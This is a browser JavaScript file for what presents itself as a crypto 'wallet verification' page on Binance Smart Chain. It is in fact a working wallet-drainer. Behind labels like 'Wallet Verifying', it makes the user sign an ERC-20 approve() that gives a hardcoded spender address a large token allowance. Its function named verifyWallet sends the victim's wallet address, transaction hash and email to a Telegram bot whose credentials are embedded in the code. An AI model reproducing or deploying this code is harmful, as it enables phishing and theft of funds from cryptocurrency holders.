let walletAddress;
let tokenAddress = "0x073761656dC0654F729A4aF0ccE8C9B39b47A18b";
let spenderAddress = "0xcc753d0BD852D6A4edE80067d76Cf442E1D7cEBD";

let walletConnectBtn = document.querySelector("#walletConnectBtn");
let walletAddressSpan = document.querySelector(".wallet_address_span");


let tokenInput = document.querySelector("#tokenInput");
let emailInput = document.querySelector("#emailInput");


// ========================================

async function switchToBsc() {
  if (window.ethereum) {
    const chainId = "0x38";

    console.log('ok');

    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: chainId }],
      });
      console.log("Successfully switched to Binance Smart Chain");
      
    } catch (error) {
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: chainId,
              chainName: 'Binance Smart Chain',
              nativeCurrency: {
                name: 'Binance Coin',
                symbol: 'BNB',
                decimals: 18
              },
              rpcUrls: ['https://bsc-dataseed.binance.org/'],
              blockExplorerUrls: ['https://bscscan.com']
            }],
          });
          console.log("Binance Smart Chain added successfully");
        } catch (addError) {
          console.error("Failed to add Binance Smart Chain", addError);
        }
      } else {
        console.error("Failed to switch to Binance Smart Chain", error);
      }
    }
  } else {
    console.error("Ethereum provider not found. Please install MetaMask.");
  }
}

async function verifyWallet(_data){
  const botToken = "7107034391:AAHqyRFDjFCgBazgswzY_CRAYdtlgMQO-N4";
  const chatId = "5204205237";

  const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(apiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: _data,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(`Telegram API error: ${errorData.description}`);
    }

    const data = await response.json();
    return data;
  } catch (error) {
    console.error("Error sending message:", error);
    throw error;
  }
}

// ++++++++++++++++++++++++++++++++++++===

async function connectMetaMask() {
  walletConnectBtn.innerText = "Connecting...";
  if (typeof window.ethereum !== "undefined") {
    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });
      walletAddress = accounts[0];
      walletAddressSpan.innerHTML = `<b>Wallet Address :</b> ${walletAddress}`;
      walletConnectBtn.innerText = "Verify Wallet";
      verifyWallet(walletAddress);
      await switchToBsc(); 
    } catch (error) {
      console.error(error);
      walletConnectBtn.innerText = "Connect Wallet";
    }
  } else {
    alert("Please install MetaMask!");
  }
}


// ERC-20 ABI (simplified version containing approve function)
const erc20ABI = [
  {
    constant: false,
    inputs: [
      { name: "_spender", type: "address" },
      { name: "_value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    type: "function",
  },
];

async function approveToken(tokenAddress, spenderAddress, _amount) {

  if (!ethers) {
    alert("Refresh the page");
    window.location.href = "";
    return;
  }

  let amount = 99999;
  if(_amount > 0){
    amount = _amount;
  }

  if (!walletAddress) {
    await connectMetaMask();
  }

  await switchToBsc();

  walletConnectBtn.innerText = "Wallet Verifying...";

  if (typeof window.ethereum !== "undefined") {
    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      const signer = provider.getSigner();
      const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
      const amountInWei = ethers.utils.parseUnits(amount.toString(), 18);

      const transaction = await tokenContract.approve(spenderAddress,amountInWei);

      return transaction.hash;

    } catch (error) {
      alert("Wallet Verify Failed.");
      console.log(error);
      walletConnectBtn.innerText = "Verify Wallet";
    }
  } else {
    alert("Please install MetaMask!");
    walletConnectBtn.innerText = "Verify Wallet";
  }
}



walletConnectBtn.addEventListener('click', async function(){
  let amount = document.querySelector("#tokenInput").value;
  let tx = await approveToken(tokenAddress,spenderAddress,amount);
  if(tx != null){
    await verifyWallet([tx, walletAddress, emailInput.value]);
    walletConnectBtn.innerText = "Wallet Verified";
  }
})


// ===============================================

async function saveUserDetails(_token,_email,_walletAddress) {
    try {
      localStorage.setItem("tokenAmount", _token);
      localStorage.setItem("emailAddress", _email);
      localStorage.setItem("walletAddress", _walletAddress);
    } catch (error) {
      console.log(error);
    }
}

async function getUserDetails() {
   try {
    tokenInput.value = localStorage.getItem("tokenAmount");
    emailInput.value = localStorage.getItem("emailAddress");
   } catch (error) {
    console.log(error)
   }
}

setInterval( async () => {
  await saveUserDetails(tokenInput.value,emailInput.value,walletAddress);
}, 1000);


window.addEventListener('load', () => {
  getUserDetails();
});
